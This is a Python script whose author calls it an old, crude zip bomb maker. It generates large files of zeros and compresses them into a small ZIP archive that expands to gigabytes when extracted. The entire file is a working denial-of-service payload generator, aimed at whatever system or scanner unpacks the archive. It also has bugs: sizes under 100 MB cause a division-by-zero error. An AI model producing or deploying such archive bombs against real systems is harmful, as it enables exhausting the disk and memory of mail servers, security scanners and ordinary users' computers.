# This is a really old and really bad zip_bomb maker
# EX: zipbomb.py file_size out_file
# Flat Zip Reference: https://github.com/damianrusinek/zip-bomb/blob/master/zip-bomb.py
# TODO: Make help string

import zipfile
import shutil
import os
import sys
import time
from typing import Any


class Globals:
  size_in_mb: int | None = None  # Argument 1
  out_file: str | None = None  # Argument 2
  dummy_name: str = 'dummy.txt'


class Helper:

  @staticmethod
  def arg_handler() -> None:
    try:
      if __file__.endswith('.py'):
        arg1: str = sys.argv[1]  # Size of the zip bomb in megabytes
        arg2: str = sys.argv[2].lower()  # Output file path / name
      if __file__.endswith('.exe'):
        arg1: str = sys.argv[1]  # Size of the zip bomb in megabytes
        arg2: str = sys.argv[2].lower()  # Output file path / name
    except Exception:
      pass

    try:
      if arg1.isdigit():  # Arg 1
        Globals.size_in_mb: int = int(arg1)
      else:
        Globals.size_in_mb: int = 5

      if os.path.exists(arg2):  # Arg 2
        print(
          f'Given output file: "{arg2}" already exists, '
          f'\ninstead the output file will be "zipbomb.zip".\n'
        )
        Globals.out_file: str = 'zipbomb.zip'
      else:
        Globals.out_file: str = arg2.replace('.zip', '') + '.zip'

    except IndexError:
      print(f'No arguments given, please pass an argument like "help".')
      sys.exit(1)  # No argument = quit program
    except UnboundLocalError:
      print(f'You seem to be missing a required argument, use "help" for more context.')
      sys.exit(1)  # No argument = quit program
    except Exception as e:
      print(f'Unknown exception occurred: \n{e}\n')
      sys.exit(1)  # Runtime error

  @staticmethod
  def generate_dummy_file(filename: str, size: int) -> None:
    with open(filename, 'w') as dummy:
      dummy.write('0' * (size * 1024 * 1024))

  @staticmethod
  def get_file_size(filename: str) -> int:
    return os.path.getsize(filename)


class Zip:

  @staticmethod
  def make_copies_and_compress(zf: zipfile.ZipFile, infile: str, copies: int) -> None:
    for i in range(copies):
      extension: str = infile[infile.rfind('.') + 1:]
      basename: str = infile[:infile.rfind('.')]
      f_name: str = f'{basename}-{i}.{extension}'

      shutil.copy(infile, f_name)
      zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
      os.remove(f_name)

  @staticmethod
  def add_file_to_zip(zf: zipfile.ZipFile, path: str, include_dir: bool = True) -> None:
    if os.path.isfile(path):
      zf.write(path, compress_type=zipfile.ZIP_DEFLATED)
    elif os.path.isdir(path):
      for root, dirs, files in os.walk(path):
        arc_root: str = root

        if not include_dir:
          arc_root: Any | str = root[len(path):]
          if arc_root.startswith(os.sep):
            arc_root: Any | str = arc_root[1:]
          else:
            arc_root: Any | str = arc_root
        for file in files:
          zf.write(os.path.join(root, file),
            arcname=os.path.join(arc_root, file))

  @staticmethod
  def create_zipbomb() -> int:
    dummy_name_format: str = 'dummy{}.txt'  # I found out what this does recently
    size: int | None = Globals.size_in_mb
    files_nb: int = int(size / 100)
    file_size: int = int(size / files_nb)
    last_file_size: int = size - (file_size * files_nb)

    # During testing i forget to change
    # output name / delete the old zip file
    if os.path.isfile(Globals.out_file):
      os.remove(Globals.out_file)

    zf: zipfile.ZipFile = zipfile.ZipFile(Globals.out_file, mode='w', allowZip64=True)

    if files_nb > 0:
      for i in range(files_nb):
        dummy_name: str = dummy_name_format.format(i)
        if i == 0:
          Helper.generate_dummy_file(dummy_name, file_size)
        else:
          os.rename(dummy_name_format.format(i - 1), dummy_name)
        zf.write(dummy_name, compress_type=zipfile.ZIP_DEFLATED)
      os.remove(dummy_name)

    if last_file_size > 0:
      dummy_name: str = dummy_name_format.format(files_nb)
      Helper.generate_dummy_file(dummy_name, last_file_size)
      zf.write(dummy_name, compress_type=zipfile.ZIP_DEFLATED)
      os.remove(dummy_name)
    zf.close()
    return files_nb * file_size


if __name__ == '__main__':
  Helper.arg_handler()
  start_time: float = time.time()
  decompressed_size: float = round(Zip.create_zipbomb() / 1024, 2)
  end_time: float = time.time()
  compressed_size: float = round(os.path.getsize(Globals.out_file) / 1000, 2)
  gen_time: float = round(end_time - start_time, 2)

  print(f'Compressed File Size: {compressed_size} KB')
  print(f'Size After Decompression: ~{decompressed_size} GB')
  print(f'Generation Time: {gen_time} secs')
